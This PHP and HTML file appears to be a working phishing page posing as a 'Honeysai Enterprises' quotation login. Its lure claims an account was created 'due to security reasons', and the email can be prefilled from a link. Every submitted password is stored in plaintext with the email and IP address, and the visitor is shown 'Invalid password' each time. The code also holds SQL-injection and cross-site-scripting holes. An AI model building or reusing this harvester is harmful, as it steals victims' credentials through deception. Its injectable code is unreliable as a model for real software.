<?php
//conection to mysql database
if (isset($_GET['email'])) {
  $email = $_GET['email'];  
}
if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];  
}

if (isset($_POST['button'])) {
 $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "honeysai_work";

// Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'];
    $ip = $_SERVER["REMOTE_ADDR"];
    if (! empty($email) && ! empty($password)) { //run the block of code if the email field is not empty
        $stmt = "INSERT INTO project (email, password, ip, date) VALUES ('{$email}','{$password}', '{$ip}', NOW())";
        if (mysqli_query($conn, $stmt) === TRUE) {
             $msg = 'Invalid password';
        } else {
             $msg = 'Invalid password';
        }
    } else {
        $msg = 'Invalid password';        
    }

    $conn->close();
}
?>
<!DOCTYPE html>

<html>
    <head>
        <meta charset="UTF-8">
        <title>Honeysai Enterprises</title>
        <link href='https://fonts.googleapis.com/css?family=Montserrat:100,400,700' rel='stylesheet' type='text/css'>
        <link href='http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css' rel='stylesheet' type='text/css'>
        <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <style>
            @import url(http://fonts.googleapis.com/css?family=Roboto:400);
            body {
                //background: url(images/index.jpg) repeat;
                background-color:#cccccc;
                -webkit-font-smoothing: antialiased;
                font: normal 14px Roboto,arial,sans-serif;
            }

            .container {
                padding: 25px;
                position: fixed;
            }

            .form-login {
                background-color: #EDEDED;
                //background:rgba(105,105,105,0.5);
                padding-top: 10px;
                padding-bottom: 20px;
                padding-left: 20px;
                padding-right: 20px;
                border-radius: 15px;
                border-color:#d2d2d2;
                border-width: 5px;
                box-shadow:0 1px 0 #cfcfcf;
            }

            h4 { 
                border:0 solid #fff; 
                border-bottom-width:1px;
                padding-bottom:10px;
                text-align: center;
            }

            .form-control {
                border-radius: 10px;
            }

            .wrapper {
                text-align: center;
            }
            .margin-top{
                margin-top: 70px;
            }
            .margin-top1{
                margin-top: 20px;
            }
            .margin-top2{
                margin-top: 10px;
            }
            .color-text1{
                color:#ff0000;
            }

        </style>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row color-text">
                <div class="col-sm-4 col-sm-offset-4 text-center margin-top1">
                    <img src="images/logo1.png" class="img-responsive" />              
                </div>               
            </div>


<?php if (isset($msg)): ?>
                <div class="row">
                    <div class="col-sm-4 col-sm-offset-4 alert alert-danger margin-top2">                   
    <?php echo $msg; ?>
                    </div>
                </div>

                <div class="row margin-top1">
                    <div class="col-sm-4 col-sm-offset-4">
                        <div class="form-login">
                            <form action="http://localhost:81/quotation/login.php" method="POST">
                                <h6 class="color-text1">We have create an account for you due to security reasons. Please login with your password to view our Quotation</h6>
                                <?php if(! empty($email)):?>
                                <input type="email" name="email" id="userName" class="form-control input-sm chat-input" value="<?php echo $email;?>" readonly />
                                
                                <?php else:?>
                                <input type="email" name="email" id="userName" class="form-control input-sm chat-input" placeholder='Enter valid email address'  />
                                <?php endif;?>
                                </br>
                                <input type="password" name="password" id="userPassword" class="form-control input-sm chat-input" placeholder="password" required="required" />
                                </br>
                                <div class="wrapper">
                                    <span class="group-btn">     
                                        <button name="button" class="btn btn-primary btn-md" type="submit" >View <i class="fa fa-sign-in"></i></button>
                                    </span>
                                </div>
                            </form>

                        </div>
                    </div>
                </div>
<?php else: ?>
                <div class="row margin-top">
                    <div class="col-sm-4 col-sm-offset-4">
                        <div class="form-login">
                            <form action="http://localhost:81/quotation/index.php" method="POST">
                                <h6 class="color-text1">We have create an account for you due to security reasons. Please login with your password to view our Quotation</h6>
                                 <?php if(! empty($email)):?>
                                <input type="email" name="email" id="userName" class="form-control input-sm chat-input" value="<?php echo $email;?>" readonly />
                                <?php else:?>
                                <input type="email" name="email" id="userName" class="form-control input-sm chat-input" placeholder='Enter valid email address' />
                                <?php endif;?>
                                </br>
                                <input type="password" name="password" id="userPassword" class="form-control input-sm chat-input" placeholder="password" required="required" />
                                </br>
                                <div class="wrapper">
                                    <span class="group-btn">     
                                        <button class="btn btn-primary btn-md" type="submit" name="button" >View <i class="fa fa-sign-in"></i></button>
                                    </span>
                                </div>
                            </form>

                        </div>
                    </div>
                </div>
<?php endif; ?>


            <div class="row">
                <div class="col-sm-4 col-sm-offset-4 text-center margin-top1">
                    <div class="row"></div>
                    <div class="row">Website:&nbsp;http://honeysaienterprise.com</div>
                    <div class="row">Copyright © 2016</div>

                </div>
            </div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
        <!-- Latest compiled JavaScript -->
        <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    </body>
</html>